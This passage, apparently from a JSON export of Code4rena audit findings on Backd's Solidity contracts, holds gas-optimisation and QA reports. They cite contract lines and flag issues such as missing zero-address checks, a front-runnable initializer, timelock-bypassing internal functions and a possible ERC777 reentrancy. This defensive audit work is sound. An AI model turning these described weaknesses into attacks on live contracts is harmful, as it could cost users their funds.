2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::500 => if (cursor >= length) return (new address[](0), 0);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::501 => if (howMany >= length - cursor) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::502 => howMany = length - cursor;\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::878 => if (_userPositions[payer].length == 0) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::890 => uint256 length = positionsMeta.length;\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::891 => for (uint256 i = 0; i < length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::894 => positionsMeta[i] = positionsMeta[length - 1];\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol::42 => if (users.length == 0) return (_shortenTopups(executableTopups, topupsAdded), 0);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol::43 => for (uint256 i = 0; i < users.length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol::46 => for (uint256 j = 0; j < positions.length; j++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol::51 => uint256 offset = j == positions.length - 1 ? 1 : 0;\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol::71 => bool[] memory results = new bool[](keys.length);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol::72 => for (uint256 i = 0; i < keys.length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol::91 => uint256 length = userRecordsMeta.length;\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol::92 => ITopUpAction.RecordWithMeta[] memory result = new ITopUpAction.RecordWithMeta[](length);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol::93 => for (uint256 i = 0; i < length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol::154 => * @dev Shortens a list of topups by truncating it to a given length.\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol::156 => * @param length The length to trucate the list of topups to.\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol::159 => function _shortenTopups(TopupData[] memory topups, uint256 length)\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol::164 => TopupData[] memory shortened = new TopupData[](length);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol::165 => for (uint256 i = 0; i < length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CTokenRegistry.sol::61 => for (uint256 i = 0; i < ctokens.length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CompoundHandler.sol::135 => for (uint256 i = 0; i < assets.length; i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol::313 => for (uint256 i = 0; i < _rewardTokens.length(); i++) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol::380 => for (uint256 i = 0; i < _rewardTokens.length(); i++) {\n\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nuint x = 0 costs more gas than uint x without having any different functionality.\n\n# C4-008 : Use Shift Right/Left instead of Division/Multiplication if possible\n\n## Impact\n\nA division/multiplication by any number x being a power of 2 can be calculated by shifting log2(x) to the right/left.\n\nWhile the DIV opcode uses 5 gas, the SHR opcode only uses 3 gas. Furthermore, Solidity's division operation also includes a division-by-0 prevention which is bypassed using shifting.\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nA division/multiplication by any number x being a power of 2 can be calculated by shifting log2(x) to the right/left.\n\n# C4-009: `> 0 can be replaced with != 0 for gas optimization`\n\n## Impact\n\n`!= 0` is a cheaper operation compared to `> 0`, when dealing with uint.\n\n\n## Proof of Concept\n\n1. Navigate to the following contracts.\n\n```\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/BkdLocker.sol::90 => require(amount > 0, Error.INVALID_AMOUNT);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/BkdLocker.sol::91 => require(totalLockedBoosted > 0, Error.NOT_ENOUGH_FUNDS);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/BkdLocker.sol::136 => require(length > 0, \"No entries\");\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/BkdLocker.sol::138 => while (i > 0) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/BkdLocker.sol::253 => if (userBalance > 0) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/BkdLocker.sol::300 => if (userBalance > 0) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/BkdLocker.sol::308 => if (lastUpdated[user] < lastMigrationEvent && userBalance > 0) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol::173 => if (cvxcrvBal > 0) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol::261 => if (IERC20(CVX_CRV).balanceOf(address(this)) > 0)\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/LpToken.sol::87 => if (amount > 0) ILiquidityPool(minter).handleLpTokenTransfer(from, to, amount); // add check to not break 0 transfers\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::47 => if (depositAmount > 0) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::57 => if (amountLeft > 0) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::210 => require(record.singleTopUpAmount > 0, Error.INVALID_AMOUNT);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::554 => require(position.totalTopUpAmount > 0, Error.INSUFFICIENT_BALANCE);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::690 => if (position.depositTokenBalance > 0) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::907 => if (IERC20(token).allowance(address(this), spender) > 0) return;\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpActionFeeHandler.sol::123 => require(totalClaimable > 0, Error.NOTHING_TO_CLAIM);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/AaveHandler.sol::58 => if (variableDebt + stableDebt > 0) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol::401 => require(_depositCap > 0, Error.INVALID_AMOUNT);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol::471 => require(underlyingAmount > 0, Error.INVALID_AMOUNT);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol::473 => require(lpToken_.balanceOf(account) > 0, Error.INSUFFICIENT_BALANCE);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol::549 => require(redeemLpTokens > 0, Error.INVALID_AMOUNT);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdEthCvx.sol::100 => if (stakedBalance > 0) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdEthCvx.sol::106 => if (lpBalance > 0) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol::151 => if (underlyingBalance > 0) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol::159 => if (hopLpBalance > 0) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol::211 => if (hopLpBalance > 0) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol::358 => if (stakedBalance > 0) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol::364 => if (lpBalance > 0) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol::399 => if (cvxCommunityReserveShare_ > 0) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol::402 => if (cvxBalance_ > 0) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol::410 => if (crvCommunityReserveShare_ > 0) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol::413 => if (crvBalance_ > 0) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/StrategySwapper.sol::111 => require(slippageTolerance_ > 0.8e18, Error.INVALID_SLIPPAGE_TOLERANCE);\n\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nUse \"!=0\" instead of \">0\" for the gas optimization.\n\n\n# C4-0010 : Free gas savings for using solidity 0.8.10+\n\n## Impact\n\nUsing newer compiler versions and the optimizer gives gas optimizations and additional safety checks are available for free.\n\n## Proof of Concept\n\n```\nAll Contracts\n```\n\n\nSolidity 0.8.10 has a useful change which reduced gas costs of external calls which expect a return value: https://blog.soliditylang.org/2021/11/09/solidity-0.8.10-release-announcement/\n\nCode Generator: Skip existence check for external contract if return data is expected. In this case, the ABI decoder will revert if the contract does not exist\n\nAll Contracts\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nConsider to upgrade pragma to at least 0.8.10.\n\n# C4-0011 : ++i is more gas efficient than i++ in loops forwarding\n\n## Impact\n\n++i is more gas efficient than i++ in loops forwarding.\n\n## Proof of Concept\n\n1. Navigate to the following contracts.\n\n```\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/BkdLocker.sol::90 => require(amount > 0, Error.INVALID_AMOUNT);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/BkdLocker.sol::91 => require(totalLockedBoosted > 0, Error.NOT_ENOUGH_FUNDS);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/BkdLocker.sol::136 => require(length > 0, \"No entries\");\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/BkdLocker.sol::138 => while (i > 0) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/BkdLocker.sol::253 => if (userBalance > 0) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/BkdLocker.sol::300 => if (userBalance > 0) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/BkdLocker.sol::308 => if (lastUpdated[user] < lastMigrationEvent && userBalance > 0) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol::173 => if (cvxcrvBal > 0) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol::261 => if (IERC20(CVX_CRV).balanceOf(address(this)) > 0)\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/LpToken.sol::87 => if (amount > 0) ILiquidityPool(minter).handleLpTokenTransfer(from, to, amount); // add check to not break 0 transfers\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::47 => if (depositAmount > 0) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::57 => if (amountLeft > 0) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::210 => require(record.singleTopUpAmount > 0, Error.INVALID_AMOUNT);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::554 => require(position.totalTopUpAmount > 0, Error.INSUFFICIENT_BALANCE);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::690 => if (position.depositTokenBalance > 0) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol::907 => if (IERC20(token).allowance(address(this), spender) > 0) return;\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpActionFeeHandler.sol::123 => require(totalClaimable > 0, Error.NOTHING_TO_CLAIM);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/AaveHandler.sol::58 => if (variableDebt + stableDebt > 0) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol::401 => require(_depositCap > 0, Error.INVALID_AMOUNT);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol::471 => require(underlyingAmount > 0, Error.INVALID_AMOUNT);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol::473 => require(lpToken_.balanceOf(account) > 0, Error.INSUFFICIENT_BALANCE);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol::549 => require(redeemLpTokens > 0, Error.INVALID_AMOUNT);\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdEthCvx.sol::100 => if (stakedBalance > 0) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdEthCvx.sol::106 => if (lpBalance > 0) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol::151 => if (underlyingBalance > 0) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol::159 => if (hopLpBalance > 0) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol::211 => if (hopLpBalance > 0) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol::358 => if (stakedBalance > 0) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol::364 => if (lpBalance > 0) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol::399 => if (cvxCommunityReserveShare_ > 0) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol::402 => if (cvxBalance_ > 0) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol::410 => if (crvCommunityReserveShare_ > 0) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol::413 => if (crvBalance_ > 0) {\n  2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/StrategySwapper.sol::111 => require(slippageTolerance_ > 0.8e18, Error.INVALID_SLIPPAGE_TOLERANCE);\n\n\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nIt is  recommend to use unchecked{++i} and change i declaration to uint256.\n\n\n# C4-0012 : Using operator && used more gas\n\n## Impact\n\nUsing double require instead of operator && can save more gas.\n\n## Proof of Concept\n\n1. Navigate to the following contracts.\n\n```\n2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/AddressProvider.sol:343:        return exists && pool == poolAddress;\n2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/AddressProvider.sol:405:        return exists && vault == stakerVault;\n2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/SwapperRegistry.sol:36:            fromToken != toToken &&\n2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/SwapperRegistry.sol:37:                fromToken != address(0) &&\n2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/SwapperRegistry.sol:38:                toToken != address(0) &&\n2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/BkdLocker.sol:308:        if (lastUpdated[user] < lastMigrationEvent && userBalance > 0) {\n2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/access/RoleManager.sol:95:        if (role == Roles.ADDRESS_PROVIDER && index == 0) {\n2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/access/RoleManager.sol:97:        } else if (role == Roles.POOL_FACTORY && index == 0) {\n2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/access/RoleManager.sol:99:        } else if (role == Roles.CONTROLLER && index == 0) {\n2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/swappers/Swapper3Crv.sol:59:            fromToken == TRI_CRV && ((toToken == DAI) || (toToken == USDC) || (toToken == USDT)),\n2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/swappers/Swapper3Crv.sol:76:            fromToken == TRI_CRV && ((toToken == DAI) || (toToken == USDC) || (toToken == USDT)),\n2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/swappers/Swapper3Crv.sol:128:        if (daiOutput > usdcOutput && daiOutput > usdtOutput) {\n2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/StakerVault.sol:386:        if (src != msg.sender && allowance_ != type(uint256).max && address(pool) != msg.sender) {\n2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol:360:            newSwapperSlippage >= _MIN_SWAPPER_SLIPPAGE &&\n2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol:676:        require(vars.success && abi.decode(vars.topupResult, (bool)), Error.TOP_UP_FAILED);\n2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol:893:            if (positionMeta.account == account && positionMeta.protocol == protocol) {\n2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CTokenRegistry.sol:50:        if (ensureExists && (address(ctoken) == address(0) || !_isCTokenUsable(ctoken))) {\n2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CTokenRegistry.sol:79:        bool deprecated = address(comptroller) == COMPTROLLER_MAINNET_ADDRESS &&\n2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CTokenRegistry.sol:81:        return listed && !deprecated;\n2022-04-backd-c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol:274:            token_ != address(_CVX) && token_ != address(underlying) && token_ != address(_CRV),\n\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nExample\n\n```\n\nusing &&:\n\nfunction check(uint x)public view{\n    require(x == 0 && x < 1 );\n}\n// gas cost 21630\n\nusing double require:\n\n    require(x == 0 );\n    require( x < 1);\n    }\n}\n// gas cost 21622\n```\n",
    "dataSource": {
      "name": "code-423n4/2022-04-backd-findings",
      "repo": "https://github.com/code-423n4/2022-04-backd-findings",
      "url": "https://github.com/code-423n4/2022-04-backd-findings/issues/192"
    }
  },
  {
    "title": "QA Report",
    "body": "# LOW\n\n### L-01: If any constant address in `CvxCrvRewardsLocker` changes, they will not be able to be updated.\n\n[ConvexStrategyBase.sol](https://github.com/code-423n4/2022-04-backd/blob/main/backd/contracts/strategies/ConvexStrategyBase.sol)\n\nIf any constant address in `CvxCrvRewardsLocker` changes, they will not be able to be updated.\n\nAlso valid for(list not exhaustive):\n-CTokenRegistry\n-ConvexStrategyBase\n-StrategySwaper\n\n### L-02: No zero address checks\n\n[CvxCrvRewardsLocker.setTreasury; L147-L154](https://github.com/code-423n4/2022-04-backd/blob/main/backd/contracts/CvxCrvRewardsLocker.sol#L147-L154)\n\nAccidentally setting `treasury` to address zero may lead to losing all funds when withdrawing.\n\n[TopUpActionFeeHandler.actionContract#L55](https://github.com/code-423n4/2022-04-backd/blob/main/backd/contracts/actions/topup/TopUpActionFeeHandler.sol#L55)\n\nIf `actionContract` is accidentally set to zero the `payFees` function would become inaccessible because there is no other way to set `actionContract`.\n\n- Recommendation\n  Implement zero address check\n\n### L-03: `safeApprove` from OpenZeppelin has been deprecated\n\n`safeApprove` from OpenZeppelin has been deprecated.\nInstead it is recommended to use increase/decrease allowance.\n\nPlease refer to [SafeERC20.sol#L38](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/566a774222707e424896c0c390a84dc3c13bdcb2/contracts/token/ERC20/utils/SafeERC20.sol#L38)\n\n# NON-CRITICAL\n\n### N-01: Confusing function naming\n\n[CvxCrvRewardsLocker.withdraw#L156-L164](https://github.com/code-423n4/2022-04-backd/blob/main/backd/contracts/CvxCrvRewardsLocker.sol#L156-L164)\n[CvxCrvRewardsLocker.withdraw#L217-L225](https://github.com/code-423n4/2022-04-backd/blob/main/backd/contracts/CvxCrvRewardsLocker.sol#L217-L225)\n\nSuggest changing withdraw#L156-L164 to fullWithdraw to avoid confusion and improve readability.\n\n### No-02: Minor typo in `CompoundHandler`\n\n[CompoundHandler#L46](https://github.com/code-423n4/2022-04-backd/blob/main/backd/contracts/actions/topup/handlers/CompoundHandler.sol#L46)\nChange tup-up to top-up.\n\n\n### N-04: ERC777 Reentrancy in `StakerVault.unstakeFor` could bypass allowance.\n\n[StakerVault.sol#L360](https://github.com/code-423n4/2022-04-backd/blob/main/backd/contracts/StakerVault.sol#L360)\n\nHook in ERC777 reenters `unstakeFor` and bypasses `_allowances` update which is only calculated after `safeTransfer`.\n\nBeaware that if LpToken ever uses the ERC777 standard this could be an attack vector.",
    "dataSource": {
      "name": "code-423n4/2022-04-backd-findings",
      "repo": "https://github.com/code-423n4/2022-04-backd-findings",
      "url": "https://github.com/code-423n4/2022-04-backd-findings/issues/187"
    }
  },
  {
    "title": "QA Report",
    "body": "Vulnerability details:\r\n## Low Risk Issues\r\n\r\n### 1. The first withdrawal for each vault from the vault reserve has no delay\r\n`_lastWithdrawal[vault]` will always be zero for new vaults, so the check is for `0 + minWithdrawalDelay` which will always be less than `block.timestamp`\r\n\r\n```solidity\r\nFile: backd/contracts/vault/VaultReserve.sol   #1\r\n\r\n102    function canWithdraw(address vault) public view returns (bool) {\r\n103        return block.timestamp >= _lastWithdrawal[vault] + minWithdrawalDelay;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/VaultReserve.sol#L102-L103\r\n\r\n### 2. `AaveHandler` does not extend `BaseHandler`\r\nUnlike `CompoundHandler`, `AaveHandler` does not extend `BaseHandler`, which will cause storage problems in future versions\r\n\r\n```solidity\r\nFile: backd/contracts/actions/topup/handlers/AaveHandler.sol   #1\r\n\r\n15 contract AaveHandler is ITopUpHandler {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/AaveHandler.sol#L15\r\n\r\n### 3. Unused `receive()` function will lock Ether in contract\r\nIf the intention is for the Ether to be used, the function should call another function, otherwise it should revert\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #1\r\n\r\n176     receive() external payable {\r\n177         // solhint-disable-previous-line no-empty-blocks\r\n178     }\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L176-L178\r\n\r\n```solidity\r\nFile: contracts/pool/EthPool.sol   #2\r\n\r\n10     receive() external payable {}\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/EthPool.sol#L10\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdEthCvx.sol   #3\r\n\r\n46     receive() external payable {}\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdEthCvx.sol#L46\r\n\r\n```solidity\r\nFile: contracts/strategies/StrategySwapper.sol   #4\r\n\r\n45     receive() external payable {}\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/StrategySwapper.sol#L45\r\n\r\n```solidity\r\nFile: contracts/vault/EthVault.sol   #5\r\n\r\n13     receive() external payable {}\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/EthVault.sol#L13\r\n\r\n### 4. `_prepareDeadline()`, `_setConfig()`, and `_executeDeadline()` should be `private`\r\nThese functions have the ability to bypass the timelocks of every setting. No contract besides the `Preparable` contract itself should need to call these functions, and having them available will lead to exploits. The contracts that currently call `_setConfig()` in their constructors should be given a new function `_initConfig()` for this purpose. The `Vault` [calls](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L222) some of these functions as well, and should be changed to manually inspect the deadline rather than mucking with the internals, which is error-prone. The mappings should also be made `private`, and there should be public getters to read their values\r\n\r\n```solidity\r\nFile: backd/contracts/utils/Preparable.sol   #1\r\n\r\n115    /**\r\n116     * @notice Execute uint256 config update (with time delay enforced).\r\n117     * @dev Needs to be called after the update was prepared. Fails if called before time delay is met.\r\n118     * @return New value.\r\n119     */\r\n120    function _executeUInt256(bytes32 key) internal returns (uint256) {\r\n121        _executeDeadline(key);\r\n122        uint256 newValue = pendingUInts256[key];\r\n123        _setConfig(key, newValue);\r\n124        return newValue;\r\n125    }\r\n126\r\n127    /**\r\n128     * @notice Execute address config update (with time delay enforced).\r\n129     * @dev Needs to be called after the update was prepared. Fails if called before time delay is met.\r\n130     * @return New value.\r\n131     */\r\n132    function _executeAddress(bytes32 key) internal returns (address) {\r\n133        _executeDeadline(key);\r\n134        address newValue = pendingAddresses[key];\r\n135        _setConfig(key, newValue);\r\n136        return newValue;\r\n137    }\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/utils/Preparable.sol#L115-L137\r\n\r\n### 5. Front-runable initializer\r\nIf the initializer is not executed in the same transaction as the constructor, a malicious user can front-run the `initialize()` call, forcing the contract to be redeployed. Most other initializers in this project are protected, but this one appears not to be.\r\n\r\n```solidity\r\nFile: backd/contracts/AddressProvider.sol   #1\r\n\r\n53    function initialize(address roleManager) external initializer {\r\n54        AddressProviderMeta.Meta memory meta = AddressProviderMeta.Meta(true, true);\r\n55        _addressKeyMetas.set(AddressProviderKeys._ROLE_MANAGER_KEY, meta.toUInt());\r\n56        _setConfig(AddressProviderKeys._ROLE_MANAGER_KEY, roleManager);\r\n57    }\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/AddressProvider.sol#L53-L57\r\n\r\n### 6. `safeApprove()` is deprecated\r\n[Deprecated](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/bfff03c0d2a59bcd8e2ead1da9aed9edf0080d05/contracts/token/ERC20/utils/SafeERC20.sol#L38-L45) in favor of `safeIncreaseAllowance()` and `safeDecreaseAllowance()`\r\n\r\n```solidity\r\nFile: contracts/actions/topup/handlers/AaveHandler.sol   #1\r\n\r\n53         IERC20(underlying).safeApprove(address(lendingPool), amount);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/AaveHandler.sol#L53\r\n\r\n```solidity\r\nFile: contracts/actions/topup/handlers/CompoundHandler.sol   #2\r\n\r\n71             IERC20(underlying).safeApprove(address(ctoken), amount);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CompoundHandler.sol#L71\r\n\r\n```solidity\r\nFile: contracts/actions/topup/handlers/CompoundHandler.sol   #3\r\n\r\n120             IERC20(underlying).safeApprove(address(ctoken), 